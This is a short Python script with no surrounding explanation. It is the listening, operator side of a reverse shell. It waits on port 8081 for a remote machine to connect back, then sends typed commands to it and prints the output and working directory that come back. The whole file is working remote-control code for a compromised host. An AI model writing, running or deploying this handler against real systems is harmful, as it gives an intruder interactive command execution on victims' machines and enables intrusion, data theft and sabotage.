import socket

END_POINT = "0.0.0.0"
PORT = 8081
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"


s = socket.socket() # creat socket
s.bind((END_POINT, PORT))

s.listen(5)
print(f"Listening  at {END_POINT}:{PORT} ...")
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")
cwd = client_socket.recv(BUFFER_SIZE).decode()
print("[+]:", cwd)
while 1:
    # read the command
    command = input(f"{cwd} $> ")
    if not command.strip():
        continue
    # send the command
    client_socket.send(command.encode())
    if command.lower() == "exit":
        break
    output = client_socket.recv(BUFFER_SIZE).decode()
    results, cwd = output.split(SEPARATOR)
    print(results)